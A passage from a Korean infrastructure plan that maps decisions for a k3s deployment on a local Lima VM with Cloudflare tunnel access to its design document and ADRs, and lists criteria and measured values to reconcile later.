D1~D9·Q1~Q23과 S1·시연·콘솔·입력 결정은 기획서 v5의 U21~U34에, 결정 N1~N3·N2a·N2b, demo-down의 VM 정지, 18090 방화벽 임시 허용, 두 토큰의 Zone:Zone:Read 승인, 토큰 IP 필터의 IPv4, 증거 가림 규칙은 U35(2026-11-20)에 반영돼 있다 (작업 트리 기준, 커밋 전). 충돌하면 이 계획의 "확정된 결정" 표와 기획서 U35를 함께 확인한다. 이 계획은 그 문서를 바꾸지 않고 따른다. 기획서는 다른 작업이 계속 갱신할 수 있으므로 Task 12에서 맞추기 전에 최신본을 다시 읽는다.

| 문서 | 이 계획과의 관계 |
|---|---|
| `docs/2026-11-11-secure-ax-k3s-design.md` v5 | U21~U32 = 이 계획의 D1~D9·Q1~Q23. U33·U34 = 후속 결정(S1 대체 LAN 스캔, 시연 켜기·끄기, `console-ipallow` 미사용, 입력 길이와 초과 처리). §11.3(`console-ipallow` 삭제, relay `/console` 보호), §11.4 에지 통제, §17 S1(인바운드 0 점검 (a)~(f), (f)는 다른 실제 기기의 LAN nmap), §17.1 공개 모드(약 1시간 데이터 물리 삭제, 7일 로그, 자유 입력 500/100자·`maxlength` + 서버 400, 가용성·`demo-up`/`demo-down`), §19 CG-CF1~CG-CF4, §20 M1 행(상세 계획으로 이 문서를 가리킴), M3/M6 공개 모드 게이트(Q16), M9(시드·데모 계정 단계만, `demo-up`/`demo-down`은 M1), 부록 A "Mac 잠자기 후 VM 시계"(M1 Task 12에서 확인) |
| `docs/adr/0014-hosting-local-lima.md` | 호스팅: 로컬 Lima VM, OCI는 향후 이전 경로 (ADR-0011 대체) |
| `docs/adr/0015-public-access-cloudflare-tunnel.md` | 공개 접근: Cloudflare 이름 있는 터널, 에지 통제 |
| `docs/adr/0003`, `0002`, `0008`, `0010`, `0011` | DNS-01 전환, 에지 WAF, N5 폐지, Tailscale 로컬 보류, OCI 대체 — 상태 갱신됨 |
| `handoff.md` | 다음 작업 = Task 2 (Step 0 + Lima VM) |
| `docs/superpowers/plans/2026-11-11-m1-infra-foundation.md` | OCI 대상 계획. `TARGET=oci` 이전 시 Task 2·3(호스트 방화벽 포함) 참고 |

**범위 밖이지만 기획서에 확정된 것 (참조만):** 요청자별 데모 계정 7일 유지와 1시간 초기화는 계정의 데이터만 지우고 합성 프로필을 재시드(U33, M9), 사용자 지정 오류 페이지 없음(U33), 자유 입력 초과 처리(U34, M3/M6), audit-anchor 외부 대상(M4, Q18).

**M1 실행 중·완료 시 기획서에 맞출 것 (Task 12 Step 11):**
- §20 M1 완료 기준을 이 계획의 C1~C19와 맞춘다 (기획서가 C1~C18이나 15개 목록을 가리키면 C1~C19로). 차이: C4에 `networks` 0개·UDP 없음·guest IP 도달 불가·다른 실제 기기의 LAN nmap 스캔(S1 (f)) 추가, C11에 설정 드리프트 기준선, C15(토큰 2개의 범위·만료·IPv4), C16(`body-limit` 413), C17(로그 위생·hostPath·logrotate 7일), C19(`demo-up`/`demo-down`) 신설, C10에 `SERVED=0` 판정 기준.
- §15.1 실측값, 부록 A의 실측 대상: Lima의 LoadBalancer 포워드 감지, 기본 네트워크에서 guest IP 도달 불가, ServiceLB를 호스트 프로세스에서 접근, cloudflared → Traefik 출발 주소(`trustedIPs`), Free Managed Ruleset 시그니처 범위, `ip.src.country` Free 사용 가능, `buffering` 413, 토큰 `expires_on`, Mac 잠자기 후 시계, 로그 보존(결정 N3: hostPath + logrotate), Traefik 차트 값 키(`forwardedHeaders`, `sniStrict`, 접근 로그 필드).
- 신뢰 프록시: 이 계획은 cloudflared 출발 주소 /32 하나를 **[Claude 제안]**으로 두고 Task 9에서 실측해 확정한다 (기본 노드 IP). 기획서·ADR이 "노드 IP만"으로 단정하고 있으면 Task 12 Step 11에서 실측값에 맞춘다.
